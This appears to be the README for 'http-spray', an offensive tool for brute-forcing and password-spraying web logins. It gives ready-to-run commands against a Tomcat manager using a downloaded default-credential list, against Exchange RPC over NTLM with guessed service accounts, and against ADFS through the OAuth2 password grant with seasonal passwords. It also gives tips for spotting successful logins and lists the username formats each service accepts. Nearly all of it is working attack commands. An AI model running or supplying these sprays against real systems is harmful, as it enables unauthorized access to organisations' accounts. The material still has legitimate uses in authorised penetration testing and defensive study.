# http-spray

Brute force Tomcat manager.

~~~ bash
curl -LO https://github.com/dadevel/wordlists/raw/main/passwords/tomcat-credentials.txt
http-spray -t https://app.corp.com/tomcat/manager/html -m basic -C ./tomcat-credentials.txt | tee -a ./log.json | jq -c 'select(.status_code != 401)'
~~~

Spray common service accounts against on-prem Exchange server.

~~~ bash
http-spray -t https://mail.corp.com/rpc/ -m ntlm -c scanner:scanner -c printer:printer | tee -a ./log.json | jq -c 'select(.status_code != 401)'
~~~

> **Note:**
> The RPC endpoint returns 404 for successful logins.
> For alternate endpoints see [here](https://github.com/dadevel/wordlists/raw/main/windows/exchange.txt).
>
> Furthermore Exchange accepts the following username formats: `jdoe`, `corp\jdoe`, `corp.com\jdoe`, `jdoe@corp.com` where `jdoe` is the *samaccountname*.
> Depending on the environment the *mail* attribute, e.g. `john.doe@corp.com`, might work for the OWA web login.

Spray weak passwords against ADFS trough OAuth2 password grant.

~~~ bash
http-spray -t https://sts.corp.com/adfs/oauth2/token/ -m oauth --client-id 11111111-2222-3333-4444-555555555555 --resource https://app.corp.com/ -U ./users.txt -p 'Summer2023!' -p 'Winter2023!' | tee -a ./log.json | jq -c 'select(.status_code == 200)'
~~~

> **Note:**
> ADFS accepts the following username formats: `corp\jdoe`, `corp.com\jdoe` and `jdoe@corp.com`.
> Depending on the environment the *mail* attribute, e.g. `john.doe@corp.com`, might work as well.
